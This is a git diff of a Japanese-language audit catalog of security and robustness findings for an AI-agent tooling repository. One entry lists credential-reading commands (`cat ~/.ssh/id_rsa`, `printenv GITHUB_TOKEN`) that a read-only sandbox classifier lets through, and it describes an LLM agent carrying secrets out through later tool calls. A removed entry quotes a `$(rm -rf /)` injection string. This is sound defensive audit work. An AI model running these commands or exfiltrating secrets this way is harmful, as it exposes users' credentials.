@@ -24,7 +24,6 @@
 | Issue | タイトル(略) | 対応 IC |
 | --- | --- | --- |
 | [#137](https://github.com/Mekann2904/mekann/issues/137) | sandbox: SBPL インジェクション + rm -rf/curl\|sh バイパス + realpath symlink 脱出 | IC-100, IC-101, IC-103, IC-104, IC-115, IC-116, IC-117 |
-| [#138](https://github.com/Mekann2904/mekann/issues/138) | security: autoresearch filterSecrets を redactSecrets へ一本化 | IC-003, IC-134 |
 | [#139](https://github.com/Mekann2904/mekann/issues/139) | data-integrity: JSONL 追記の非アトミック・並列混線 | IC-017, IC-036, IC-140 |
 | [#140](https://github.com/Mekann2904/mekann/issues/140) | command-normalization: grep 正規表現 + SHELL_OPERATORS + quote() | IC-061, IC-062, IC-065, IC-066 |
 | [#141](https://github.com/Mekann2904/mekann/issues/141) | type-safety: 非テスト 117 件の as any を削減 | IC-002, IC-027, IC-028, IC-046, IC-047, IC-050, IC-084, IC-086, IC-124, IC-132, IC-144, IC-146 |
@@ -85,8 +84,8 @@
 ### IC-165 `sandbox/output.ts` が `redactSecrets` と `gateTextForLlm` を組み合わせ (IC-138 と対照的に sandbox は安全側)
 - **カテゴリ**: 整理 / 一貫性
 - **対象**: `mekann/safety/sandbox/output.ts:24-29`
-- **概要**: `source: { kind: "sandboxed_bash", command: redactSecrets(input.command).text.slice(0, 2000) }` で、sandbox 経路は **`tool-output/redact.ts` の `redactSecrets` を正しく使用**(IC-138 で一本化を推奨した関数)。つまり sandbox 出力は 8 パターンで保護されるが、autoresearch 出力(IC-138)は 2 パターンのみ。同じ bash 実行経路で保護度が逆転しており、一本化(IC-138)の必要性を裏付ける追加証拠。
-- **提案**: IC-138 の解決で autoresearch 側も `redactSecrets` に統一すれば、sandbox と autoresearch の bash 出力保護度が一致。
+- **概要**: `source: { kind: "sandboxed_bash", command: redactSecrets(input.command).text.slice(0, 2000) }` で、sandbox 経路は **`tool-output/redact.ts` の `redactSecrets` を正しく使用**(IC-138 で一本化を推奨した関数)。sandbox出力は既存の共通redaction経路を正しく利用している。
+
 
 ### IC-166 `sandbox executionControl.executeBash` の権限エラー正規表現が英語のみ
 - **カテゴリ**: 国際化 / 堅牢性 — IC-060 群と同根
@@ -107,7 +106,9 @@
   - `printenv` / `printenv GITHUB_TOKEN` / `env` → 全環境変数(トークン類)のダンプ → ALLOWED
   - `grep -r password .` → パスワード記述の検出 → ALLOWED
   - `cat /etc/passwd` → システム情報 → ALLOWED
-  SHELL_META/DESTRUCTIVE チェックは `$(`/`;`/`|` 等は弾くが、単体コマンドには効かない。`git-safety`(IC-013 関連)は git/gh コマンドのみ対象で `cat`/`env` は素通り。
+  SHELL_META/DESTRUCTIVE チェックは `
+$(
+`/`;`/`|` 等は弾くが、単体コマンドには効かない。`git-safety`(IC-013 関連)は git/gh コマンドのみ対象で `cat`/`env` は素通り。
 - **境界の前提**: コメントは「UX guard, NOT a security boundary。security は sandbox の OS-level policy」と明記。**しかし read_only sandbox モードは書き込みのみ拒否し読み込みは許可する**(`~/.ssh` 配下の読み出しも、環境変数の取得も阻止しない)。つまり read-only モードでは、LLM エージェントがこれら「read-only」コマンドで**秘密を会話に持ち込み**、ユーザの意図しない外部送信(次の turn の web 検索、HTTP ツール等)に使える。
 - **検証**: `node` で `classify('cat ~/.ssh/id_rsa')` 等が全て `read_only (ALLOWED)` になることを確認。
 - **提案**:
@@ -119,13 +120,6 @@
 
 > **2026-06-17 重要度下方修正**: `mekann/safety/sandbox/macSeatbelt.ts:54`(`HOME: isolatedHome`)と `buildSandboxEnv` が限定的環境変数のみ渡す設計のため、**sandbox 経路では `env`/`printenv`/`~/.ssh` ベクトルは強力に緩和される**(isolated HOME と env サブセットで実本物トークンは見えない)。ただし **workspace 内ファイル(`.env`/`.pi/mekann.json`/`.aws/` 等の repo 配下秘密)は readableRoots に含まれ読み取り可能**なので、この経路の残存リスクは残る。深刻度は 🔴高 → 🟠中 に下方修正。主提案は「workspace 内秘密ファイルの read-only モードでの読み取り制限」に絞り込む。
 
-### IC-168 `contractV1 validateContractV1` のシェルメタ文字検出がほぼ無意味 (IC-026/IC-144 と同根)
-- **カテゴリ**: 堅牢性 / セキュリティ (誤検知の安全光)
-- **対象**: `mekann/autonomy/autoresearch/contractV1/schema.ts:245-251`
-- **概要**: `if (new RegExp(String.fromCharCode(96) + "$").test(arg) && cmd.argv.length === 1)` で、**単一要素 argv かつ末尾がバッククォート**の場合のみ警告。これは (a) `String.fromCharCode(96)` の backtick ハック(IC-026 と同根で可読性低下)、(b) 末尾一致のみ(中間含む場合は検出しない)、(c) `;`/`|`/`$()` 等の他のシェルメタを全く検出しない、(d) argv 実行モードではそもそもシェル展開されないので**検出する意味が薄い**、という 4 重に問題。
-- **検証**: `node` で `/$/` が `'foobar'`(中間バッククォート)や `'$(rm -rf /)'`(`$()` 注入)にマッチしないことを確認。
-- **提案**: argv モードの安全性説明に徹するか(シェルメタは文字通り扱われるので安全)、シェルメタ検出を廃止。IC-026/IC-144 と合わせて backtick ハックの除去を統一タスクに。
-
 ### IC-169 `settings store.ts snapshotLoaded` が都度ディープクローン (ホットパス性能)
 - **カテゴリ**: パフォーマンス
 - **対象**: `mekann/settings/store.ts:54-56, 97-100`
@@ -135,38 +129,6 @@
 ---
 
 ## 第24バッチ (探索継続)
-
-### IC-170 `contractV1/safety.ts matchesPath` の glob 実装が char class と `**/bar` 直接ケースに未対応 (バグ)
-- **カテゴリ**: バグ (計算精度) / セキュリティ (権限スコープ誤判定)
-- **対象**: `mekann/autonomy/autoresearch/contractV1/safety.ts:53-91` (`matchesPath`)
-- **概要**: 手作り glob→regex 変換で2つの確定バグ:
-  1. **char class `[abc]` 未対応**: コメント「Escape regex special chars (except * and ?)」だが正規表現 `[.+^${}()|[]\f]` で `[`/`]` をエスケープしてしまい、`[abc].ts` が「`[abc]` そのもの」にしかマッチしない。本来 glob の `[abc].ts` は `a.ts`/`b.ts`/`c.ts` にマッチすべき。実装は `[abc].ts` → literal `[abc].ts` と同値に。
-  2. **`foo/**/bar` の直接ケース `foo/bar` 未対応**: `**` は `.*`(任意文字)に変換されるため `foo/**/bar` → `foo/.*/bar` となり、`foo/bar` はマッチしない。POSIX glob の `**` セマンティクスでは「0個以上のディレクトリ」なので `foo/bar` も含むべき。
-  結果: `contract.scope.allowedWritePaths`/`forbiddenWritePaths`/`immutableReadPaths` にこれらのパターンを書いたユーザが「許可したはずが拒否」「禁止したはずが許可」の誤判定を受ける。IC-156(withinAny の `*` 未解釈)と同根だが、`matchesPath` は glob を**一部**解釈するため誤認しやすい。
-- **検証**: `node` で `matchesPath('[abc].ts','a.ts')` → false、`matchesPath('foo/**/bar','foo/bar')` → false を確認。
-- **提案**: 既存 glob ライブラリ(`minimatch`/`picomatch`/`tinyglobby`(既に依存にある))に一本化。または char class と `**` セマンティクス(`**/` は 0 個以上ディレクトリ)を手直し。プロパティテストで POSIX glob 互換を網羅。
-
-### IC-171 `agentView.ts checkVisibility/checkPhase` が `(check as any).visibility` でスキーマ外フィールド推測 (IC-141 同根)
-- **カテゴリ**: 型安全性 / 設計
-- **対象**: `mekann/autonomy/autoresearch/contractV1/agentView.ts:8-15`
-- **概要**: `checkVisibility(check)` が `(check as any).visibility === "evaluator_only"` で、TypeBox schema の `ContractCheck` 型に無い `visibility`/`phase` フィールドを `as any` で読む。schema が strict(`additionalProperties: false`) なら、これらフィールドは検証で弾かれ**常に undefined** → 常に `"agent_visible"`/`"post_benchmark"`。隠し機能として document されておらず、将来の schema 緩和で突然挙動が変わる恐れ。
-- **提案**: `ContractCheck` schema に `visibility`/`phase` を正式追加するか、読み取りを廃止。`as any` 削除。
-
-### IC-172 `candidate.ts assertCandidateId` が `arc_<base36>_<counter>` のみ許可 (IC-044/IC-008 修正後の ID を拒否)
-- **カテゴリ**: 堅牢性 / 移行
-- **対象**: `mekann/autonomy/autoresearch/candidate.ts:51`
-- **概要**: `if (!/^arc_[a-z0-9]+_[0-9]+$/i.test(id)) throw ...` で、候補 ID を `arc_<time>_<counter>` のみ許可。IC-008/IC-044 で candidate ID を UUID ベースに変更すると、この正規表現が新 ID を拒否して「Invalid candidate_id」でクラッシュ。修正をセットで更新しないと回帰。
-- **提案**: IC-008/IC-044 の解決時に `assertCandidateId` 正規表現を緩和(`arc_[a-z0-9_]+$` 等の UUID 対応)。
-
-### IC-173 `candidate.ts candidateChangedFiles` が `fs.existsSync` + `statSync` をループ内で同期呼び出し (IC-006/IC-142 同根)
-- **カテゴリ**: パフォーマンス / 堅牢性
-- **対象**: `mekann/autonomy/autoresearch/candidate.ts:80-90, 100-105`
-- **概要**: `candidateChangedFiles` が `filterInternalPaths(getChangedFiles(cwd))` の各パスで `fs.existsSync(abs)` → `fs.statSync(abs).isDirectory()` → `walkFiles(abs)`(再帰 readdirSync)を呼ぶ。多数ファイル変更時に同期 IO の線形リスト。「ホットパスでない」(autoresearch の candidate 評価時)とはいえ、candidate 適用の逐次処理でレイテンシ蓄積。
-- **提案**: ディレクトリ判定を `getChangedFiles` 側で一度に取得、または非同期化。
-
----
-
-## 第25バッチ (探索継続)
 
 ### IC-174 `context-control planner.ts` の圧力/子算閾値が全てハードコード (チューニング性)
 - **カテゴリ**: 設計 / チューニング性
@@ -190,7 +152,9 @@
 - **カテゴリ**: 堅牢性
 - **対象**: `mekann/context/context-control/planner.ts:71-73` ("\\bog_[a-z0-9]+_[a-z0-9]+\\b")
 - **概要**: メッセージテキストから output-gate artifact ID を抽出する正規表現。IC-015 で提案した「output-gate ID にランダムサフィックス追加(`og_<time>_<counter>_<rand>`)」を実施すると、この正規表現(`/\\bog_[a-z0-9]+_[a-z0-9]+\\b/`)が新 ID にマッチしなくなり、planner が artifact を「既に外部化済み」と検出できず重複 externalize 推奨を出す。
-- **提案**: IC-015 の ID 形式変更時に `outputGateArtifactId` 正規表現を緩和(`\\bog_[a-z0-9_]+\\b`)。`store.ts:267` の manifest ID 検証正規表現(/^og_[a-z0-9]+_[a-z0-9]+$/)ともセットで更新。
+- **提案**: IC-015 の ID 形式変更時に `outputGateArtifactId` 正規表現を緩和(`\\bog_[a-z0-9_]+\\b`)。`store.ts:267` の manifest ID 検証正規表現(
+/^og_[a-z0-9]+_[a-z0-9]+$/
+)ともセットで更新。
 
 ### IC-178 `analysis.ts estimateTokens` が `Math.ceil(bytes / 4)` (IC-127/IC-133 と同根、第5実例)
 - **カテゴリ**: バグ (計算精度) / 国際化
@@ -202,64 +166,11 @@
 
 ## 第26バッチ (探索継続)
 
-### IC-179 autoresearch tools `signal: any` と `undefined as unknown as void` の型安全でない妥協 (IC-141 同根)
-- **カテゴリ**: 型安全性 / 設計
-- **対象**: `mekann/autonomy/autoresearch/tools/approve.ts:46` (`signal: any`)、`:132` (`return undefined as unknown as void`)
-- **概要**: `executeApprove(store, params, signal: any, ctx, deps)` で signal を `any` 受け。さらに `if (check?.required && !passed) return ...; return undefined as unknown as void;` のコールバック戻り型を `void` に無理押し。pi SDK の型が合わないのを `any`/`as unknown as void` で迂回しており、signal の型変更やコールバック契約変更で無言で壊れる。IC-141(as any 廃止)と同根。
-- **提案**: pi SDK の `AbortSignal`/tool execute signature 型を取り込み、`signal: AbortSignal` へ。コールバック戻り型を `ToolResponse | undefined` に正しく付与。
-
-### IC-180 `approve.ts contractId` が `Date.now()` + hash slice で衝突リスク (IC-008/IC-044 と同根)
-- **カテゴリ**: データ整合性
-- **対象**: `mekann/autonomy/autoresearch/tools/approve.ts:108`
-- **概要**: `` const contractId = `contract-${Date.now()}-${contractHash.slice(7, 15)}` `` で、`Date.now()`(ms) + hash 8 文字。同一 ms に2つの approve(並列 pi プロセス)が走ると prefix が衝突し、hash slice 8 文字(16^8 ≒ 43億)で識別。確率は低いが IC-008/IC-044 と同じ「プロセスローカル時間ベース ID」問題。並列 candidate 評価(autopilot)でレース。
-- **提案**: IC-008 の乱数 ID 化に contractId も統合。
-
-### IC-181 `commandHandler.archiveFile` が `renameSync` 失敗時に `copyFileSync + rmSync` フォールバック (非アトミック)
-- **カテゴリ**: データ整合性 / リポジトリ衛生
-- **対象**: `mekann/autonomy/autoresearch/tools/commandHandler.ts:26-33`
-- **概要**: `try { fs.renameSync(src, dest); } catch { try { fs.copyFileSync(src, dest); fs.rmSync(src, { force: true }); } catch (e) { warnings.push(...); } }`。cross-volume rename 失敗時の copy+rm フォールバックは**非アトミック**で、`copyFileSync` 途中でクラッシュすると src/dest 両方が中途半端。IC-032(settings saveSettingsChecked)や IC-040(成果物書き込み)と同じ非アトミック書き込みパターンの別実例。
-- **提案**: 共通のアトミックファイル操作ヘルパ(tmp + rename)に統合。失敗時は src を残して警告。
-
-### IC-182 `commandHandler` の clear サブコマンドが多数の `rmSync(recursive)` を握り潰し (IC-039/IC-151 と同根)
-- **カテゴリ**: セーフティ / デバッグ性
-- **対象**: `mekann/autonomy/autoresearch/tools/commandHandler.ts:69-132`
-- **概要**: `clear` サブコマンドが journal/events.md/contract.json/lock.json/runs/plans/candidates など多数のファイル/ディレクトリを `rmSync(recursive, true)` で削除。各々 `try { ... } catch {}` で握り潰し。`runs` や `candidates` 配下の削除で、誤って広いパス(`.`, cwd)が渡ると壊滅的。path traversal ガードが見当たらない。
-- **提案**: 削除前にパスが期待プレフィックス(`.autoresearch/`)内であることを assert。失敗を集計して warnings に追加(IC-146 の構造化ログと統合)。
-
-### IC-183 `sharedHelpers.loadRunFromPlanArtifact` が大量の `JSON.parse(readFileSync)` + `catch {}` (IC-007/IC-056/IC-146 同根)
-- **カテゴリ**: データ整合性 / デバッグ性
-- **対象**: `mekann/autonomy/autoresearch/tools/sharedHelpers.ts:101-170`
-- **概要**: run の manifest.json/checks.result.json/metrics.json を `JSON.parse(fs.readFileSync(...))` で同期的に読み、各々 `catch { /* legacy/no/try next */ }` で握り潰し。破損成果物や欠損ファイルを「データ無し」と同視し、autoresearch の baseline metric 解決が黙って失敗する。IC-007/IC-056/IC-146(best-effort catch 共通化)と、IC-142(同期 IO)の両方に合致。
-- **提案**: IC-146 の構造化ログで「どの成果物が読めなかったか」を記録。IC-142 の非同期化とセット。
-
-### IC-184 `candidates.ts` の全アクションが `catch (e) { return store.textResponse('[ERROR] ... failed: ' + ...) }` でエラー文字列化
-- **カテゴリ**: デバッグ性 / エラーハンドリング
-- **対象**: `mekann/autonomy/autoresearch/tools/candidates.ts:19,24,33,38,45,52`
-- **概要**: candidate escrow/list/show/reject/apply/applyIsolated の全ハンドラが `try { ... } catch (e) { return store.textResponse('[ERROR] ... failed: ${e.message}') }`。エラーをユーザ向け文字列に変換する意図だが、(a) スタック/cause が消失、(b) 呼び出し元(agent)が「error 発生」を機械的に判定できず文字列解析に頼る必要がある、(c) e.message に内部パスやシークレットが含まれる可能性。
-- **提案**: `store.errorResponse(kind, details)` のような構造化エラー型を導入。isError フラグと details で伝達。
-
----
-
-## 第27バッチ (探索継続)
-
-### IC-185 `state.parseMetricLines` が `Infinity`/`-Infinity` を受け入れ、JSON 直列化で `null` に化ける
-- **カテゴリ**: バグ (計算精度) / データ整合性
-- **対象**: `mekann/autonomy/autoresearch/state.ts:339-358` (`parseMetricLines`)
-- **概要**: `const value = Number(valueStr); if (name && !isNaN(value)) metrics[name] = value;` で、`Number("Infinity")` = `Infinity`、`isNaN(Infinity)` = false なので **Infinity が格納される**。しかし `metrics` は後で `JSON.stringify` され(`writeFileSync(metrics.json)` 等の成果物保存)、`JSON.stringify({x: Infinity})` → `{"x":null}`。読み取り側は `null` を受け取り、metric 比較(`isBestMetric`)で Infinity vs null の挙動が不定。`-Infinity`、`1e999`(Overflow→Infinity)も同様。
-- **検証**: `node` で `parseMetricLines('METRIC x=Infinity')` が `{x: Infinity}` を返し、`JSON.stringify` で `{"x":null}` になることを確認。
-- **提案**: `if (name && Number.isFinite(value)) metrics[name] = value;`(`isNaN` → `Number.isFinite`)に変更。プロパティテストで Infinity/NaN/巨大数を網羅。
-
 ### IC-186 `subagentSurfaceSync.hasPendingResults` が `catch { return false }` (IC-146 同根、第N実例)
 - **カテゴリ**: デバッグ性 / 堅牢性
 - **対象**: `mekann/autonomy/subagent/subagentSurfaceSync.ts:43-49`
 - **概要**: `try { return resultStore.list({ status: "pending" }).length > 0; } catch { return false; }` で、resultStore の読み取り失敗(IC-007 の握り潰し/破損)を「pending 無し」と同視。ユーザには結果ストアが壊れていても「agent_results」ツールが非表示のままになり、気付けない。
 - **提案**: IC-146 の構造化ログに統合。surface 制御の判断材料として「不明」状態を区別。
-
-### IC-187 `protocol.ts autoresearchTool` が `execute: (...args: any[]) => unknown` で完全型放棄 (IC-141 同根)
-- **カテゴリ**: 型安全性 / API 設計
-- **対象**: `mekann/autonomy/autoresearch/tools/protocol.ts:13-19`
-- **概要**: `export interface AutoresearchToolSpec { ... parameters: unknown; execute: (...args: any[]) => unknown; }` と、`autoresearchTool(spec): Parameters<ExtensionAPI["registerTool"]>[0] { return spec as Parameters<...>[0]; }`。pi の `registerTool` の厳密な型シグネチャを `...args: any[]` と `as` で完全に放棄。handler 側で `params as any`(IC-046)と合わさって、schema と handler の不整合が究極的に検知できない。IC-141/IC-046 の根にある設計。
-- **提案**: pi SDK の tool registration 型を取り込み、`AutoresearchToolSpec` を generics 化(`AutoresearchToolSpec<P, R>`)。`as` で迂回せず型安全に register。
 
 ### IC-188 `resultStoreAdapter` / `subagentSurfaceSync` の分離は良好だが、pi SDK 依存の型が thin (整理)
 - **カテゴリ**: 整理 / 型安全性
@@ -394,7 +305,6 @@
 ### IC-001 重範な巨大ファイル (1000行超) の分割未実施
 - **カテゴリ**: 保守性 / アーキテクチャ
 - **対象**:
-  - `mekann/autonomy/autoresearch/runner.ts` (1064 行)
   - `mekann/core/cache-friendly-prompt/report.ts` (1056 行)
 - **概要**: `runner.ts` は git 操作・checks 実行・spawn・秘密情報フィルタ・ログ切り詰めなど複数責務を1ファイルに抱え込み、`report.ts` は集計・SVG レンダリング・HTML 生成まで巨大化している。
 - **根拠**: `wc -l` で上記2ファイルが 1000 行超。変更の衝突リスクとテスト分離が困難。
@@ -415,29 +325,6 @@
   }
   ```
 - **提案**: `Record<string, unknown>` を `unknown` 値として型安全に検証する zod / manual guard に置換。少なくとも `as Goal` への単一キャストに集約し、フィールドアクセスを型付きで行う。
-
-### IC-003 `filterSecrets` のカバレッジが不十分 (秘密漏洩リスク)
-- **カテゴリ**: セキュリティ
-- **対象**: `mekann/autonomy/autoresearch/runner.ts:179-191`
-- **概要**: 秘密マスキングが `API_KEY|SECRET|PASSWORD|TOKEN|PRIVATE_KEY=` と `Authorization: Bearer` の2パターンのみ。AWS アクセスキー(`AKIA...`)、base64 エンコード値、`-e ENV=secret` 形式、`.env` 行、JSON 内の秘密フィールドなどを逃す。
-- **根拠**:
-  ```ts
-  const SECRET_REPLACEMENTS: Array<[RegExp, ...]> = [
-    [/(API_KEY|SECRET|PASSWORD|TOKEN|PRIVATE_KEY)[\s]*[=:]\s*\S+/gi, ...],
-    [/(Authorization\s*:\s*Bearer)\s+\S+/gi, ...],
-  ];
-  ```
-- **提案**: 既知の鍵パターン(AWS/GCP/GitHub PAT `ghp_`/`gto_`/Slack 等)を追加、`process.env` 由来の値を動的にマスク、autoresearch の全出力経路で適用。
-
-### IC-004 autoresearch のデフォルト benchmark が `exit 1` で即失敗
-- **カテゴリ**: UX / 堅牢性
-- **対象**: `mekann/autonomy/autoresearch/tools/init.ts:128`
-- **概要**: `benchmark_command` 未指定かつ `./autoresearch.sh` のとき、生成スクリプトが `echo 'TODO: implement benchmark'; exit 1` となり、実行時に即クラッシュする。
-- **根拠**:
-  ```ts
-  : "echo 'TODO: implement benchmark' >&2\nexit 1\n";
-  ```
-- **提案**: 初期化時に benchmark 未指定を明示的に警告し、計測をスキップするかユーザに入力を促すモードを用意。`TODO` 文言のまま出荷しない。
 
 ### IC-005 `settings-editor` のログパスが `/tmp` 直書き (非ポータブル)
 - **カテゴリ**: 堅牢性 / ポータビリティ
@@ -578,16 +465,6 @@
 - **根拠**: workflow 内で `Coverage threshold check` ステップが上記2ジョブにしか無い。
 - **提案**: 各 workspace に `check:coverage:*` スクリプトと閾値を設定、`scripts/check-coverage-threshold.sh` を全ワークスペースに拡張。
 
-### IC-021 `autoresearch/layout.ts` が生成シェルスクリプト内に `require()` を埋め込む
-- **カテゴリ**: 堅牢性 / CJS-ESM 混在
-- **対象**: `mekann/autonomy/autoresearch/layout.ts:210-211`
-- **概要**: 生成する `autoresearch.sh` が `node -e "console.log(require('./.autoresearch/state.json').currentPlanDir)"` を含む。プロジェクト側が ESM(`"type":"module"` 等) の場合、この `require` は `ReferenceError` で失敗する。現在の対象が CJS 前提で偶然動いているだけ。
-- **根拠**:
-  ```sh
-  PLAN_DIR="$(node -e "console.log(require('./.autoresearch/state.json').currentPlanDir)")"
-  ```
-- **提案**: `node --input-type=commonjs` 明示、または `fs.readFileSync` を使った ESM-safe なスニペット(`createRequire` 使用)に置換。
-
 ### IC-022 `dashboard/cleanup.ts` が SIGINT を奪って常に `process.exit(130)` する
 - **カテゴリ**: プロセス制御 / 副作用
 - **対象**: `mekann/utils/dashboard/cleanup.ts:13-18`
@@ -619,13 +496,6 @@
 - **対象**: `mekann/context/context-control/views/dashboard.ts:197, 337-342`
 - **概要**: ポーリングで取得した HTML を `DOMParser` でパースし `document.querySelector('main').innerHTML = next` で差し替え。サーバ側 `esc()` が不完全(IC-024)な場合、または将来の描画追加で未エスケープ経路が混入すると、`innerHTML` 経由でスクリプトが走る。localhost 専用とはいえ、コンテキストレジャやイベントにユーザ入力が流れるためリスク非ゼロ。
 - **提案**: `innerHTML` ではなく `replaceChildren` + パース済みノードの移植、または DOMPurify 相当のサニタイズ層。最低限 IC-024 のエスケープ完全化とセットで。
-
-### IC-026 `crypto.ts` がバッククォートを `String.fromCharCode(96,96,96)` で回避 (可読性低下)
-- **カテゴリ**: 可読性 / 保守性
-- **対象**: `mekann/autonomy/autoresearch/contractV1/crypto.ts:79,91`
-- **概要**: Markdown フェンス(```` ``` ```)の正規表現を組み立てるため `String.fromCharCode(96,96,96)` を使っている。テンプレート内に埋め込まれた別のテンプレートリテラルと衝突回避と思われるが、意図が即座に読めず、コードレビューでバグを見逃しやすい。
-- **根拠**: `const match = line.match(new RegExp(String.fromCharCode(96,96,96) + "\\s*(.+)$"));`
-- **提案**: `const FENCE = "`".repeat(3);` のような名前付き定数、または外部定数として定義し、正規表現は `new RegExp(ence${FENCE}fence...)` ではなく文字列結合で明示化。
 
 ### IC-027 `subagentSpawner` が `(session as any).agent?.state?.tools` で内部 API を掘る
 - **カテゴリ**: 型安全性 / カプセル化侵害
@@ -659,9 +529,9 @@
 
 ### IC-031 ルート直下の個人メモ風ファイル群がGit 管理下
 - **カテゴリ**: リポジトリ衛生
-- **対象**: `memo.md` は gitignore 済み(IC-006a で訂正済み)だが、`autoresearch.checks.sh`/`autoresearch.jsonl`/`autoresearch.sh`/`evaluate_maintenance.sh`/`results.tsv` が `.gitignore` に列挙済み → これらは未追跡でOK。
-- **副産物**: `git ls-files` で `benchmark-startup.{ts,mjs}` は追跡されている。`.gitignore` の `autoresearch.*` パターンは広すぎて、将来 `autoresearch.config.ts` のような**追跡したい**ファイルまで無視される恐れ。
-- **提案**: `.gitignore` の `autoresearch.*` を `/autoresearch.sh` `/autoresearch.md` `/autoresearch.jsonl` `/autoresearch.plan.md` のように**先頭 `/` + 完全名**で明示的に列挙し、意図せぬ ignore を防ぐ。
+- **対象**: `memo.md`、`evaluate_maintenance.sh`、`results.tsv` は `.gitignore` に列挙済みで未追跡。
+- **副産物**: `git ls-files` で `benchmark-startup.{ts,mjs}` は追跡されている。
+
 
 ---
 
@@ -694,41 +564,11 @@
 - **概要**: コメント自体が制限を明記している通り、外部プロセス(`mekann settings-editor` CLI やエディタ)が settings を編集しても、実行中 pi のキャッシュは更新されない。`saveSettingsChecked` 経由なら更新されるが、CLI 直書きや外部エディタでは `invalidateSettingsCache` を手動呼び出しする術が UI 側に無い。
 - **提案**: `fs.watch` ベースのキャッシュ無効化を追加(デバウンス付き)。ADR-0013(Mekann settings 用 専用 mekann.json)の精神で、settings 変更イベントを context ledger にも記録。
 
-### IC-036 autoresearch の JSONL追記にロックが無い (settings と不整合)
-- **カテゴリ**: データ整合性 / 一貫性
-- **対象**: `mekann/autonomy/autoresearch/state.ts:171` (`appendToJsonl` → `fs.appendFileSync`)
-- **概要**: `settings/store.ts` は `withSettingsLock` で協調するのに、autoresearch の `appendToJsonl` は素の `appendFileSync` のみ。autoresearch は並列 pi プロセス(メイン+サブエージェント+issue pi)から同じ `.autoresearch/*.jsonl` を追記しうる設計(CONTEXT.md の context isolation と矛盾)で、行 interleaving で壊れた JSON 行ができる。IC-017 と同じ根の問題だが autoresearch 側はさらに同期 IO。
-- **提案**: ledger(IC-017) と合わせて、mekann 全体の「追記型 JSONL」には共通のアトミック追記ヘルパ(ロック + rename)を提供。CONTEXT.md の「Context event relation」用語と整合させる。
-
-### IC-037 autoresearch `tools/log.ts` の大量の best-effort catch がエラーを隠蔽
-- **カテゴリ**: デバッグ性 / データ整合性
-- **対象**: `mekann/autonomy/autoresearch/tools/log.ts:250,256,280,288,294,304,316,339,352,360,384-385` ほか
-- **概要**: canonical journal / state / ledger への追記・読み取りが全て `try { ... } catch (e) { errors.push(...); }` でエラーを文字列化して配列に貯める。エラーは最終結果に含まれるが、一部(`250,256` 等)は `catch { /* best effort */ }` で完全に握り潰す。autoresearch の判定結果(成功/失敗)に直結する証拠が静かに欠落する恐れ。
-- **根拠**: `catch { /* best effort */ }` の無言化が複数行。
-- **提案**: 握り潰しを廃止し、全て `errors.push(...)` 経路に統一。重大な失敗(証拠保全不可)は autoresearch の判定ステータスに反映(context ledger の `status: stale/invalidated` を活用)。
-
----
-
-## 第5バッチ (探索継続)
-
 ### IC-038 `image-worker-pool` の `taskId: Date.now()` が同一ms内で衝突
 - **カテゴリ**: データ整合性 / 並行性
 - **対象**: `mekann/utils/image-worker-pool/index.ts:82`
 - **概要**: `worker.postMessage({ taskId: Date.now(), input })` でタスク ID に `Date.now()`(ms精度)を使用。1ms以内に複数ディスパッチすると同じ `taskId` が複数ワーカーに流れ、応答紐付けが壊れる可能性。`worker.once("message")` で都度 resolve しているので実害は限定的だが、ID の一意性保証が無い。
 - **提案**: 単調増加カウンタ(`let taskSeq = 0; ...taskId: ++taskSeq`)または `crypto.randomUUID()` に置換。
-
-### IC-039 `candidate.ts removeCandidateWorktree` の `rmSync(recursive:true)` が破壊的フォールバック
-- **カテゴリ**: セーフティ / データ損失リスク
-- **対象**: `mekann/autonomy/autoresearch/candidate.ts:192`
-- **概要**: `git worktree remove --force` 失敗時に `if (fs.existsSync(wt)) fs.rmSync(wt, { recursive: true, force: true })` で**フォルダ毎削除**。`wt = candidateWorktreePath(cwd, c.candidate_id)` が誤って広いパス(空文字や cwd 直下)を返すと、リポジトリ全体や HOME を消し込む。`worktree_path` は candidate JSON からも読む(`c.trial?.worktree_path ?? ...`)ため、破損 JSON で任意パス削除に悪用しうる。
-- **根拠**: `const wt = c.trial?.worktree_path ?? candidateWorktreePath(cwd, c.candidate_id);`
-- **提案**: 削除前にパスが期待プレフィックス(`.autoresearch/worktrees/` 等)に収まることを assert。`git worktree remove` 失敗時は手動削除せずエラーを残すか、専用 sandbox ディレクトリ内のみ許可。
-
-### IC-040 autoresearch の成果物書き込みが非アトミック (クラッシュで部分的成果物)
-- **カテゴリ**: データ整合性
-- **対象**: `mekann/autonomy/autoresearch/tools/run.ts:209-222` (git.status.txt/git.diff/metrics.json/result.json の直接 writeFileSync)
-- **概要**: 一連の成果物を `writeFileSync(path, ...)` で直接書き込み。クラッシュすると一部だけ更新された「半完成」成果物が残り、後続の再実行や比較が壊れる。`metrics.json`/`result.json` は指標計算の入力なので特に重要。
-- **提案**: tmp 書き込み + rename のアトミック置換(settings の `saveSettingsChecked` と同じパターン)を共通ヘルパ化して適用。
 
 ### IC-041 `agentControl.shutdown` の `.catch(() => undefined)` で close エラーが全て無視
 - **カテゴリ**: デバッグ性 / リソースリーク
@@ -749,12 +589,6 @@
 - **根拠**: `if (!child.killed) child.kill();` — シグナル指定なし、グループ kill なし。
 - **提案**: `spawn(..., { detached: true })` + `process.kill(-child.pid, 'SIGTERM')` でグループ kill。タイムアウト後に SIGKILL。当リポジトリの `macSeatbelt.ts` の `killProcessGroup` パターンと統合。
 
-### IC-044 autoresearch `candidate.ts` の `let counter = 0` モジュール状態 (ID 衝突)
-- **カテゴリ**: データ整合性
-- **対象**: `mekann/autonomy/autoresearch/candidate.ts:36`
-- **概要**: candidate ID 用の `let counter = 0` がプロセスローカル。複数 pi プロセスが同時に候補作成すると同じ ID が振られ、`writeCandidate` が互いに上書き。output-gate(IC-015)・ledger(IC-002 周辺) と同じプロセスローカルカウンタ問題が点在。
-- **提案**: `crypto.randomBytes` ベースの ID に統一。または candidate 作成を単一ライターに集約。
-
 ### IC-045 `verify/index.ts` が `npm run` を順次実行 (並列化の余地)
 - **カテゴリ**: パフォーマンス / UX
 - **対象**: `mekann/utils/verify/index.ts:64-66`
@@ -764,23 +598,6 @@
 ---
 
 ## 第6バッチ (探索継続)
-
-### IC-046 ツールパラメータアクセスが系統的に `params as any` (型安全でない schema→handler)
-- **カテゴリ**: 型安全性 (系統的)
-- **対象**:
-  - `mekann/context/output-gate/index.ts:127-150` (1ツール内14回 `as any`)
-  - `mekann/context/ledger/index.ts:89-117`
-  - `mekann/autonomy/autoresearch/toolsRegistration.ts:44-72,112-121`
-  - `mekann/autonomy/subagent/index.ts` (準備段)
